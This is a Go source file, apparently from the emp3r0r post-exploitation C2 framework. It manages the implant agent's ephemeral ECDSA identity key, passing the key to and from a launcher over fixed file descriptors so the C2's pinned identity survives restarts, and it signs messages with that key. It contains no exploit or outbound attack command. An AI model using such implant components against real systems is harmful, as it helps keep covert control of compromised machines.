package agentutils

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/sha256"
	"crypto/x509"
	"fmt"
	"io"
	"os"
	"sync"
	"sync/atomic"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

const (
	// agentKeyInFD and agentKeyOutFD are the descriptors the launcher uses to
	// hand the agent the identity key and receive it back. They are deliberately
	// high: the Go runtime owns low descriptors (epoll/eventfd live around 3-5),
	// so fixed low FDs would corrupt the runtime. The launcher must dup2 its key
	// pipes to exactly these numbers.
	agentKeyInFD  = 100
	agentKeyOutFD = 101
	// p256ScalarLen is the size of a P-256 private scalar.
	p256ScalarLen = 32
)

var (
	// AgentKey is the unique ephemeral key for this agent session
	AgentKey     *ecdsa.PrivateKey
	agentKeyMu   sync.RWMutex
	agentKeyOnce sync.Once

	// supervised is set once the agent has successfully handed its identity
	// key to a launcher. It means a parent process is managing our lifecycle and
	// can terminate us when we go idle.
	supervised atomic.Bool
)

// Supervised reports whether a launcher is managing this agent process, which
// is what makes asking the parent to terminate us (instead of exiting) safe.
func Supervised() bool { return supervised.Load() }

func setAgentKey(key *ecdsa.PrivateKey) {
	agentKeyMu.Lock()
	AgentKey = key
	agentKeyMu.Unlock()
}

// AgentPrivateKey returns the current agent private key, generating it if needed.
func AgentPrivateKey() (*ecdsa.PrivateKey, error) {
	if err := GetAgentKey(); err != nil {
		return nil, err
	}

	agentKeyMu.RLock()
	key := AgentKey
	agentKeyMu.RUnlock()
	if key == nil {
		return nil, fmt.Errorf("agent key is nil")
	}

	return key, nil
}

// encodeAgentKey serializes the private scalar of an ephemeral agent key. This
// is raw key material, not a seed: the launcher must restore the exact same
// P-256 key pair so the C2's pinned TOFU identity does not change.
func encodeAgentKey(key *ecdsa.PrivateKey) []byte {
	return key.D.FillBytes(make([]byte, p256ScalarLen))
}

// parsePreservedAgentKey restores the exact key pair the launcher cached. It
// returns ok=false when the material is missing, truncated, or invalid.
func parsePreservedAgentKey(r io.Reader) (key *ecdsa.PrivateKey, ok bool) {
	raw := make([]byte, p256ScalarLen)
	n, err := io.ReadFull(r, raw)
	if err != nil || n != p256ScalarLen {
		return nil, false
	}

	parsed, err := ecdsa.ParseRawPrivateKey(elliptic.P256(), raw)
	if err != nil {
		logging.Warningf("launcher-provided agent key is invalid: %v", err)
		return nil, false
	}
	return parsed, true
}

// readPreservedAgentKey loads the ephemeral identity key the launcher cached
// from a previous lifecycle. The PFS session key is NOT involved here: that one
// is re-negotiated via ECDH on every message tunnel and must never be pinned.
func readPreservedAgentKey() (*ecdsa.PrivateKey, bool) {
	if common.RuntimeConfig == nil || !common.RuntimeConfig.IsRunByStager {
		return nil, false
	}

	f := os.NewFile(uintptr(agentKeyInFD), "agent_key_in")
	if f == nil {
		return nil, false
	}
	defer f.Close()

	return parsePreservedAgentKey(f)
}

// exportAgentKey hands the ephemeral identity key to the launcher. It runs on
// every lifecycle, including when the key was restored, so the launcher always
// holds the current private scalar.
func exportAgentKey(key *ecdsa.PrivateKey) {
	if common.RuntimeConfig == nil || !common.RuntimeConfig.IsRunByStager {
		return
	}

	f := os.NewFile(uintptr(agentKeyOutFD), "agent_key_out")
	if f == nil {
		return
	}
	defer f.Close()

	if _, err := f.Write(encodeAgentKey(key)); err != nil {
		logging.Warningf("cannot hand agent key to launcher: %v", err)
		return
	}
	// A successful hand-off means a launcher is listening on the other end.
	supervised.Store(true)
}

func logKeyThumbprint(key *ecdsa.PrivateKey, source string) {
	pubKeyBytes, err := x509.MarshalPKIXPublicKey(&key.PublicKey)
	if err != nil {
		logging.Warningf("cannot marshal agent public key: %v", err)
		return
	}
	pubKeyHash := sha256.Sum256(pubKeyBytes)
	logging.Infof("Agent key %s. Public key thumbprint: %x", source, pubKeyHash[:8])
}

// GetAgentKey returns the agent's ephemeral TOFU identity key.
//
// It first tries to restore the exact key pair the launcher cached from a
// previous lifecycle, so a recycled process keeps its identity. Only when no
// cached key is available does it generate a fresh pair, then hand it back to
// the launcher for the next restart.
func GetAgentKey() error {
	agentKeyMu.RLock()
	if AgentKey != nil {
		agentKeyMu.RUnlock()
		return nil
	}
	agentKeyMu.RUnlock()

	var err error
	agentKeyOnce.Do(func() {
		agentKeyMu.RLock()
		if AgentKey != nil {
			agentKeyMu.RUnlock()
			return
		}
		agentKeyMu.RUnlock()

		if preserved, ok := readPreservedAgentKey(); ok {
			setAgentKey(preserved)
			logKeyThumbprint(preserved, "restored from launcher")
			exportAgentKey(preserved)
			return
		}

		logging.Infof("Generating ephemeral agent key (PFS enabled)...")
		generatedKey, keyErr := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
		if keyErr != nil {
			err = keyErr
			return
		}
		setAgentKey(generatedKey)
		logKeyThumbprint(generatedKey, "generated")
		exportAgentKey(generatedKey)
	})

	if err != nil {
		return fmt.Errorf("failed to generate ephemeral key: %v", err)
	}

	agentKeyMu.RLock()
	haveKey := AgentKey != nil
	agentKeyMu.RUnlock()
	if !haveKey {
		return fmt.Errorf("agent key is unavailable")
	}
	return nil
}

// RenewAgentKey force-regenerates the ephemeral agent key.
// Primarily used for testing key rotation scenarios.
func RenewAgentKey() error {
	logging.Infof("Renewing ephemeral agent key...")
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return fmt.Errorf("failed to renew ephemeral key: %v", err)
	}
	setAgentKey(key)
	return nil
}

// SignWithAgentKey signs data with the agent's unique key
func SignWithAgentKey(data []byte) ([]byte, error) {
	key, err := AgentPrivateKey()
	if err != nil {
		return nil, fmt.Errorf("get key: %v", err)
	}
	return transport.SignJSONWithKey(key, data)
}
